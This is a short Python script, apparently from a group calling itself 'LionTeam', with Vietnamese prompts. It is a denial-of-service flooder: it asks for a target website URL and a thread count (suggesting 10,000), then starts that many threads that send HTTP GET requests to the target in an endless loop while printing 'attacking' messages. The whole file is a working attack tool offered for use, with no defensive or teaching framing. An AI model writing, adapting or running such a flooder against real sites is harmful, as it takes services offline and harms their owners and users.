import colorama
import threading
import requests
 
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("< / > Đang Attack < / >")
        except requests.exceptions.ConnectionError:
            print("[error] " + "Kế Nối Bị Lỗi")
 
threads = 20

print("""

           ▄▄                                                                                                     
▀████▀     ██                     ███▀▀██▀▀███                                    ▀███▀▀▀██▄         ██           
  ██                              █▀   ██   ▀█                                      ██    ██         ██           
  ██     ▀███   ▄██▀██▄▀████████▄      ██      ▄▄█▀██ ▄█▀██▄ ▀████████▄█████▄       ██    ██ ▄▄█▀████████ ▄█▀██▄  
  ██       ██  ██▀   ▀██ ██    ██      ██     ▄█▀   ███   ██   ██    ██    ██       ██▀▀▀█▄▄▄█▀   ██ ██  ██   ██  
  ██     ▄ ██  ██     ██ ██    ██      ██     ██▀▀▀▀▀▀▄█████   ██    ██    ██       ██    ▀███▀▀▀▀▀▀ ██   ▄█████  
  ██    ▄█ ██  ██▄   ▄██ ██    ██      ██     ██▄    ▄█   ██   ██    ██    ██       ██    ▄███▄    ▄ ██  ██   ██  
██████████████▄ ▀█████▀▄████  ████▄  ▄████▄    ▀█████▀████▀██▄████  ████  ████▄   ▄████████  ▀█████▀ ▀████████▀██▄
                                                                                                                  
                                                                                                                  
                                                                                                                  Version 1

""")

print('Copyright infringement : LionTeam Admin')
print('Zalo : https://zalo.me/nhatquyendev ')
url = input("Thêm URL Website (https//:nhatquyenit.net) >> ")
 
try:
    threads = int(input("Số Luồng (10.000) > "))
except ValueError:
    exit("Số Luồng Không Chính Xác")
 
if threads == 0:
    exit("Số Luồng Không Chính Xác")
 
if not url.__contains__("http"):
    exit("URL KHÔNG THÊM http or https")
 
if not url.__contains__("."):
    exit("Tên Miền Không Hợp Lệ")
 
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")